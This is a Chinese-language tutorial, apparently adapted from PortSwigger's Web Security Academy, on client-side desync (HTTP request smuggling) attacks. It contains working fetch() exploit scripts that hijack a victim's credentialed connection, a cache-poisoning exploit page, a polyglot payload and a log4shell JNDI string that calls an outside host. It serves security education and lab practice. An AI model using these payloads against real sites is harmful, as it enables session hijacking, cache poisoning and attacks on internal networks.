# 客户端反同步攻击

经典的请求走私攻击依赖于普通浏览器根本不会发送的故意格式错误的请求。这将此类攻击限制在使用前端/后端架构的网站上。然而，正如我们从 [CL.0 攻击](https://portswigger.net/web-security/request-smuggling/browser/cl-0) 中学到的，使用完全与浏览器兼容的 HTTP/1.1 请求也可能引起反同步。这不仅为服务器端请求走私开辟了新的可能性，还启用了一类全新的威胁——客户端反同步攻击。

> #### PortSwigger 研究
>
> 本节中的材料和实验基于 PortSwigger Research 的 [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks)。

## 什么是客户端反同步攻击？

客户端反同步（CSD）是一种使受害者的 Web 浏览器与其自身到易受攻击网站的连接失去同步的攻击。这与常规请求走私攻击形成对比，后者会使前端和后端服务器之间的连接失去同步。

![客户端反同步攻击](https://portswigger.net/web-security/request-smuggling/images/client-side-desync.jpg)

Web 服务器有时可以被诱使响应 `POST` 请求而不读取消息体。如果它们随后允许浏览器为后续请求复用同一连接，就会导致客户端反同步漏洞。

从高层面上看，CSD 攻击涉及以下阶段：

1. 受害者访问一个包含恶意 JavaScript 的任意域上的网页。
2. JavaScript 使受害者的浏览器向易受攻击的网站发出请求。该请求在其消息体中包含一个攻击者控制的请求前缀，这与正常的请求走私攻击非常相似。
3. 在服务器对初始请求做出响应后，恶意前缀被留在服务器的 TCP/TLS 套接字上，导致与浏览器的连接失同步。
4. 然后 JavaScript 触发一个通过被投毒连接发出的后续请求。该请求被附加到恶意前缀后面，从服务器引发有害响应。

由于这些攻击不依赖于两台服务器之间的解析差异，这意味着即使是单服务器网站也可能易受攻击。

> **注意：** 要使这些攻击生效，目标 Web 服务器必须不支持 HTTP/2。客户端反同步依赖于 HTTP/1.1 连接复用，而浏览器在可用时通常优先使用 HTTP/2。
>
> 此规则的一个例外是，如果您怀疑预期受害者将通过仅支持 HTTP/1.1 的转发代理访问该站点。

## 测试客户端反同步漏洞

由于依赖浏览器来传递攻击增加了复杂性，测试客户端反同步漏洞时必须系统化。尽管有时可能很想跳跃前进，但我们建议采用以下工作流程。这确保您分阶段确认对攻击每个元素的假设。

1. [在 Burp 中探测潜在的反同步向量。](#探测客户端反同步向量)
2. [在 Burp 中确认反同步向量。](#在-burp-中确认反同步向量)
3. [在浏览器中构建概念验证以复现行为。](#在浏览器中构建概念验证)
4. 识别可利用的小工具。
5. 在 Burp 中构造一个有效的漏洞利用。
6. 在浏览器中复现漏洞利用。

Burp Scanner 和 [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) 扩展都可以帮助您自动化此过程中的大部分工作，但了解如何手动执行对于巩固您对其工作原理的理解是有用的。

### 探测客户端反同步向量

测试客户端反同步漏洞的第一步是识别或构造一个使服务器忽略 `Content-Length` 头的请求。探测此行为的最简单方法是发送一个指定的 `Content-Length` 长于实际消息体的请求：

- 如果请求只是挂起或超时，这表明服务器正在等待头部承诺的剩余字节。
- 如果您立即收到响应，您可能找到了一个 CSD 向量。这值得进一步调查。

与 [CL.0 漏洞](https://portswigger.net/web-security/request-smuggling/browser/cl-0) 一样，我们发现最可能的候选者是那些不期望 `POST` 请求的端点，例如静态文件或服务器级重定向。

或者，您可以通过触发服务器错误来诱发这种行为。在这种情况下，请记住您仍然需要一个浏览器会跨域发送的请求。在实践中，这意味着您只能篡改 URL、消息体，以及少数零碎的东西，如 `Referer` 头和 `Content-Type` 头的后半部分：

```http
Referer: https://evil-user.net/?%00
Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x
```

您也可以通过尝试导航到 Web 根目录之上来触发服务器错误。请记住，浏览器会规范化路径，因此您需要对遍历序列中的字符进行 URL 编码：

```http
GET /%2e%2e%2f HTTP/1.1
```

### 在 Burp 中确认反同步向量

需要注意的是，一些安全的服务器会在不等待消息体的情况下响应，但会在消息体到达时正确解析它。其他服务器不能正确处理 `Content-Length`，但在响应后立即关闭连接，使其无法利用。

为了过滤掉这些，尝试通过同一连接发送两个请求，看看是否可以使用第一个请求的消息体来影响对第二个请求的响应，就像您在[探测 CL.0 请求走私](https://portswigger.net/web-security/request-smuggling/browser/cl-0#testing-for-cl-0-vulnerabilities)时一样。

### 在浏览器中构建概念验证

一旦您使用 Burp 识别出合适的向量，确认您可以在浏览器中复现该反同步非常重要。

> **浏览器要求**
>
> 为了减少任何干扰并确保您的测试尽可能模拟任意受害者的浏览器：
>
> - 使用**不**通过 Burp Suite 代理流量的浏览器——使用任何 HTTP 代理都可能对您攻击的成功产生重大影响。我们推荐 Chrome，因为其开发者工具提供了一些有用的故障排除功能。
>   - 在 lab 中，尝试使用 burp 代理的浏览器必然测试失败。
>   - burp 的 chrome 任务栏中右键打开 chromium（非新窗口或新任务），即为不被代理的 chrome 浏览器
> - 禁用任何浏览器扩展。

1. 转到您计划向受害者发起攻击的站点。该站点必须与易受攻击的站点在不同的域上，并通过 HTTPS 访问。为了我们实验的目的，您可以使用提供的 exploit server。
2. 打开浏览器的开发者工具并转到 **Network** 选项卡。
3. 进行以下调整：
   - 选择 **Preserve log** 选项。
   - 右键单击表头并启用 **Connection ID** 列。
   
   这确保了浏览器发送的每个请求都被记录在 **Network** 选项卡上，以及它使用的连接详情。这有助于稍后解决任何问题。
4. 切换到 **Console** 选项卡，并使用 `fetch()` 复现您在 Burp 中测试的反同步探测。代码应如下所示：

```javascript
fetch('https://vulnerable-website.com/vulnerable-endpoint', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', // 恶意前缀
    mode: 'no-cors', // 确保连接 ID 在 Network 选项卡上可见
    credentials: 'include' // 投毒 "with-cookies" 连接池
}).then(() => {
    fetch('https://vulnerable-website.com/', { // 使用被投毒的连接
        mode: 'no-cors', // 启用跨域
        credentials: 'include' // 携带凭证
    })
})
```

除了指定 `POST` 方法并将我们的恶意前缀添加到消息体外，请注意我们设置了以下选项：

- `mode: 'no-cors'` —— 这确保了每个请求的连接 ID 在 **Network** 选项卡上可见，有助于故障排除。
- `credentials: 'include'` —— 浏览器通常对带 Cookie 的请求和不带 Cookie 的请求使用不同的连接池。此选项确保您正在投毒“带 Cookie”池，这在大多数漏洞利用中都是需要的。

请求2的 `fetch` 设置选项：

- `mode: 'no-cors'` 启用跨域，而不会被浏览器拦截
- `credentials: 'include'` 携带凭证，之后将被走私请求窃取

当您运行此命令时，您应该在 **Network** 选项卡上看到两个请求。第一个请求应收到正常的响应。如果第二个请求收到对恶意前缀的响应（在此情况下为 404），这确认您已成功从浏览器触发了反同步。

> 注意，此处移除了原主题示例的 `location`。在 lab 中顶级导航将被执行，而不会被走私污染。猜测 `fetch` 使用同一会话连接，而 `location` 开启新连接

### 处理重定向

正如我们已经提到的，对触发服务器级重定向的端点的请求是客户端反同步的常见向量。在构建漏洞利用时，这会带来一个小障碍，因为浏览器会跟随此重定向，从而破坏攻击序列。幸运的是，有一个简单的变通方法。

通过为初始请求设置 `mode: 'cors'` 选项，您可以故意触发 CORS 错误，从而阻止浏览器跟随重定向。然后，您可以通过调用 `catch()` 而不是 `then()` 来恢复攻击序列。例如：

```javascript
fetch('https://vulnerable-website.com/redirect-me', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    fetch('https://vulnerable-website.com/', { 
        mode: 'no-cors', // 启用跨域
        credentials: 'include' // 携带凭证
    })
})
```

这种方法的缺点是无法在 **Network** 选项卡上看到连接 ID，这可能会使故障排除更加困难。

## 利用客户端反同步漏洞

一旦您[找到合适的向量](#探测客户端反同步向量)并[确认您可以在浏览器中成功引起反同步](#在浏览器中构建概念验证)，您就可以开始寻找可利用的小工具了。

### 经典攻击的客户端变体

您可以使用这些技术执行许多与服务器端请求走私相同的攻击。您只需要受害者访问一个恶意网站，该网站会导致他们的浏览器发起攻击。

### 客户端缓存投毒

我们之前介绍了如何使用服务器端反同步将站点内重定向转变为开放重定向，使您能够劫持 JavaScript 资源导入。您可以使用客户端反同步实现相同的效果，但在正确的时间投毒正确的连接可能很棘手。使用反同步投毒浏览器的缓存要容易得多。这样，您就不必担心它使用哪个连接来加载资源。

在本节中，我们将引导您完成构造此攻击的过程。这涉及以下高层步骤：

1. [识别合适的 CSD 向量](#探测客户端反同步向量)并使浏览器的连接失同步。
2. [使用失同步的连接通过重定向投毒缓存。](#通过重定向投毒缓存)
3. [触发来自目标域的资源导入。](#触发资源导入)
4. [传递载荷。](#传递载荷)

> **注意：** 在浏览器中测试此攻击时，请确保在每次尝试之间清除缓存（**Settings > Clear browsing data > Cached images and files**）。

#### 通过重定向投毒缓存

一旦您[找到 CSD 向量](#探测客户端反同步向量)并[确认您可以在浏览器中复现它](#在浏览器中构建概念验证)，您需要识别一个合适的[重定向小工具](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect)。之后，投毒缓存就相当简单了。

首先，调整您的概念验证，使走私前缀触发重定向到您将托管恶意载荷的域。接下来，将后续请求更改为对目标 JavaScript 文件的直接请求。

结果代码应类似于：

```html
<script>
    fetch('https://vulnerable-website.com/desync-vector', {
        method: 'POST',
        body: 'GET /redirect-me HTTP/1.1\r\nFoo: x',
        credentials: 'include',
        mode: 'no-cors'
    }).then(() => {
        location = 'https://vulnerable-website.com/resources/target.js'
    })
</script>
```

这将投毒缓存，尽管会无限重定向回您的脚本。您可以通过在浏览器中查看脚本并研究开发者工具的 **Network** 选项卡来确认这一点。

> **注意：** 您需要通过顶级导航到目标域来触发后续请求。由于浏览器分区其缓存的方式，使用 `fetch()` 发出跨域请求将投毒错误的缓存。

#### 触发资源导入

将您的受害者送入无限循环可能有点恼人，但这不算什么漏洞利用。您现在需要进一步开发您的脚本，以便当浏览器在缓存已被投毒后返回时，它被导航到易受攻击站点上将触发资源导入的页面。这可以通过使用条件语句根据浏览器窗口是否已查看过您的脚本来执行不同代码来轻松实现。

当浏览器尝试在目标站点上导入资源时，它将使用其被投毒的缓存条目，并被重定向回您的恶意页面。

#### 传递载荷

在这个阶段，您已经为攻击奠定了基础，但最后的挑战是如何传递潜在有害的载荷。

最初，受害者的浏览器将您的恶意页面加载为 HTML，并在您自己的域上下文中执行嵌套的 JavaScript。当它最终尝试在目标域上导入 JavaScript 资源并被重定向到您的恶意页面时，您会注意到脚本不会执行。这是因为当浏览器期望 JavaScript 时，您仍在提供 HTML。

对于实际的漏洞利用，您需要一种从同一端点提供纯 JavaScript 的方法，同时确保这仅在最后阶段执行，以避免干扰设置请求。

一种可能的方法是通过将 HTML 包装在 JavaScript 注释中来创建多语言载荷：

```javascript
alert(1);
/*
<script>
    fetch( ... )
</script>
*/
```

当浏览器将页面加载为 HTML 时，它只会执行 `<script>` 标签中的 JavaScript。当它最终在 JavaScript 上下文中加载此内容时，它只会执行 `alert()` 载荷，将内容的其余部分视为任意开发者注释。

有关我们如何在实际中发现此漏洞的更多信息，请查看 PortSwigger Research 的 [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#cisco)。

### 针对内部基础设施的横向攻击

大多数服务器端反同步攻击涉及以仅能使用 Burp Repeater 等工具的方式操纵 HTTP 头。例如，不可能让某人的浏览器发送带有 log4shell 载荷的 `User-Agent` 头的请求：

```http
GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

这意味着这些攻击通常仅限于您可以直接访问的网站。然而，如果网站容易受到客户端反同步攻击，您可以通过诱导受害者的浏览器发送以下请求来达到预期效果：

```http
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 etc.
Content-Length: 86

GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

由于所有请求都源自受害者的浏览器，这使您能够针对他们有权访问的任何网站进行横向攻击。这包括位于受信任内部网络或隐藏在基于 IP 的限制后面的站点。一些浏览器正在研究针对这些类型攻击的缓解措施，但这些措施可能只有部分覆盖。
